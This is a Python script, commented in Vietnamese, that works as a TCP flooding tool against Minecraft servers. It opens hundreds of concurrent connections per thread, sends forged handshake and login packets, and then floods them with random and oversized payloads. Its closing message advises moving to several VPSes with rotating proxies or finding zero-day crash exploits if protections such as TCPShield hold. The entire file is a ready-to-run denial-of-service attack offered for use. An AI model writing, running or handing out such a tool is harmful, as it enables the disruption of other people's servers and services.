import os
import sys
import socket
import threading
import time
import random
import struct
import select
from datetime import datetime
from colorama import init, Fore, Style

init(autoreset=True)

def clear_screen():
    os.system('cls' if os.name == 'nt' else 'clear')

BANNER = f"""
{Fore.RED}SKI TCP GOD MODE 2026 - MAX CONCURRENCY{Style.RESET_ALL}
   Handshake + Login + Oversized Spam
"""

def varint_encode(n):
    out = bytearray()
    while True:
        b = n & 0x7F
        n >>= 7
        out.append(b | (0x80 if n else 0))
        if not n: break
    return bytes(out)

def fake_handshake(host, port, protocol=767):
    p = varint_encode(protocol)
    p += varint_encode(len(host)) + host.encode()
    p += struct.pack('>H', port)
    p += varint_encode(2)  # login state
    return varint_encode(len(p)) + b'\x00' + p

def fake_login():
    name = f"stresser{random.randint(100000,999999)}"
    p = varint_encode(len(name)) + name.encode()
    return varint_encode(len(p)) + b'\x00' + p

class Flooder:
    def __init__(self, ip, port, duration, thread_id):
        self.ip = ip
        self.port = port
        self.duration = duration
        self.thread_id = thread_id
        self.stop = False
        self.conns = {}          # fd -> socket
        self.last_send = {}      # fd -> timestamp
        self.sent = 0
        self.start_time = time.time()

    def run(self):
        while time.time() - self.start_time < self.duration and not self.stop:
            self.maintain_connections()
            self.send_on_ready()
            time.sleep(0.015)  # nhẹ nhàng, tránh CPU 100%

        self.cleanup()
        rate = self.sent / max(1, time.time() - self.start_time)
        print(f"{Fore.YELLOW}[T{self.thread_id}] STOP • {self.sent:,} pkts | ~{rate:.0f}/s{Style.RESET_ALL}")

    def maintain_connections(self):
        target = random.randint(180, 400)  # max conn mỗi thread
        while len(self.conns) < target:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.setblocking(False)
                s.connect_ex((self.ip, self.port))  # non-blocking connect
                self.conns[s.fileno()] = s
                self.last_send[s.fileno()] = 0

                # Gửi handshake + login ngay
                host_fake = f"fuck{random.randint(1,9999)}"
                hs = fake_handshake(host_fake, self.port)
                login = fake_login()
                s.send(hs)
                time.sleep(0.008)
                s.send(login)
                self.sent += 2

            except:
                pass  # connect fail thì skip

    def send_on_ready(self):
        rlist, wlist, _ = select.select([], list(self.conns.values()), [], 0.1)
        for s in wlist:
            fd = s.fileno()
            if time.time() - self.last_send.get(fd, 0) < 0.03:
                continue

            try:
                # Xen kẽ: 70% packet nhỏ, 30% oversized
                if random.random() < 0.7:
                    data = random.randbytes(random.randint(64, 512))
                else:
                    data = random.randbytes(random.randint(4096, 32768))

                s.send(data)
                self.sent += 1
                self.last_send[fd] = time.time()

                # Random close 8-15% để tạo half-open + reconnect
                if random.random() < 0.12:
                    del self.conns[fd]
                    s.close()

            except:
                if fd in self.conns:
                    del self.conns[fd]
                try: s.close()
                except: pass

    def cleanup(self):
        for s in list(self.conns.values()):
            try: s.close()
            except: pass
        self.conns.clear()

def main():
    clear_screen()
    print(BANNER)

    target = input(f"{Fore.YELLOW}[>] Target (ip:port hoặc domain:port): ").strip()
    if ':' in target:
        host, p = target.rsplit(':', 1)
        ip = socket.gethostbyname(host)
        port = int(p)
    else:
        ip = socket.gethostbyname(target)
        port = 25565

    print(f"{Fore.GREEN}[+] Locked → {ip}:{port}{Style.RESET_ALL}")

    duration = int(input(f"{Fore.YELLOW}[>] Thời gian (giây): ") or 300)
    thread_count = int(input(f"{Fore.YELLOW}[>] Threads (100-600): ") or 400)

    print(f"\n{Fore.RED}→ MAX TCP CONCURRENCY FLOOD BẮT ĐẦU...{Style.RESET_ALL}\n")

    threads = []
    for i in range(thread_count):
        f = Flooder(ip, port, duration, i+1)
        t = threading.Thread(target=f.run, daemon=True)
        t.start()
        threads.append(t)

    time.sleep(duration + 5)

    for t in threads:
        t.join(timeout=3)

    print(f"\n{Fore.GREEN}XONG. Nếu vẫn đéo sập thì 99% là có TCPShield/Cloudflare Spectrum hoặc rate-limit quá mạnh.{Style.RESET_ALL}")
    print(f"   → Chuyển sang nhiều VPS + socks proxy rotate hoặc tìm zero-day book/crash exploit đi bro.")

if __name__ == "__main__":
    main()
